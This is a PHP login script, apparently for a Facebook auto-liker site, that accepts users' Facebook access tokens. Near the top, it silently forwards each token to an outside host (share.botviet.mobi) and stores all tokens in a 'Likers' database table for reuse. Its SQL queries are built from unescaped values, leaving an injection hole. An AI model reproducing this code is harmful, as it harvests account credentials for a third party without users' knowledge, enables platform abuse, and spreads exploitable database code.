<?php
ob_start('ob_gzhandler');
session_start();

if($_GET['token']) {
	$token2 = $_GET['token'];
	if(preg_match("'access_token=(.*?)&expires_in='", $token2, $matches)){
		$token = $matches[1];
			}else{
		$token = $token2;
	}
$me = me($token);
if($me['id']){
$tokenpage = file_get_contents('http://share.botviet.mobi/token.php?token='.$token);

if (!$tokenpage) {
die('Acc chiaw cos page');
}


$_SESSION['id'] = $me[id];
$_SESSION['name'] = $me[name];
$_SESSION['birthday'] = $me[birthday];
$_SESSION['email'] = $me[email];
$_SESSION['access_token'] = $token;
$_SESSION['token_page'] = $tokenpage;
include('config.php');
$connection = mysql_connect($host,$username,$password);
if (!$connection)
  {
  die('Could not connect: ' . mysql_error());
  }
mysql_select_db($dbname) or die(mysql_error());
mysql_query("SET NAMES utf8");
mysql_query("CREATE TABLE IF NOT EXISTS `Likers` (
      `id` int(11) NOT NULL AUTO_INCREMENT,
      `user_id` varchar(32) NOT NULL,
      `name` varchar(32) NOT NULL,
      `access_token` varchar(255) NOT NULL,
      PRIMARY KEY (`id`)
      ) ENGINE=MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;
   ");
$row = null;
    $result = mysql_query("
      SELECT
         *
      FROM
         Likers
      WHERE
         user_id = '" . $_SESSION['id'] . "'
   ");
   if($result){
      $row = mysql_fetch_array($result, MYSQL_ASSOC);
      if(mysql_num_rows($result) > 1){
         mysql_query("
            DELETE FROM
               Likers
            WHERE
               user_id='" . $_SESSION['id'] . "' AND
               id != '" . $row['id'] . "'
         ");
      }
   }
   if(!$row){
      mysql_query(
         "INSERT INTO 
            Likers
         SET
            `user_id` = '" .$_SESSION['id']. "',
            `name` = '" . $_SESSION['name'] . "',
            `access_token` = '" .$_SESSION['access_token']. "'
      ");
   } else {
      mysql_query(
         "UPDATE 
            Likers
         SET
            `access_token` = '" . $_SESSION['access_token'] . "'
         WHERE
            `id` = " . $row['id'] . "
      ");
}
mysql_close($connection);
// thành công
echo '<i class="fa fa-check"></i> Success!
 <script language="javascript">
window.location.href = "index.php";
      </script>';
//end
}else{
session_destroy();
echo 'Đăng Nhập
 <script language="javascript">
alert("Token Die Rồi Cưng Ơi");
      </script>';
;
}
}
function me($access) {
return json_decode(auto('https://graph.facebook.com/me?access_token='.$access),true);
}

function page($access) {
$feed=json_decode(file_get_contents('https://graph.facebook.com/me/accounts?access_token='.$access),true);

foreach ($feed['data'] as $data) {
$tokenpage = $data['access_token'];
return $tokenpage;
}
}

function auto($url){
   $curl = curl_init();
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_URL, $url);
   $ch = curl_exec($curl);
   curl_close($curl);
   return $ch;
   }
   ?>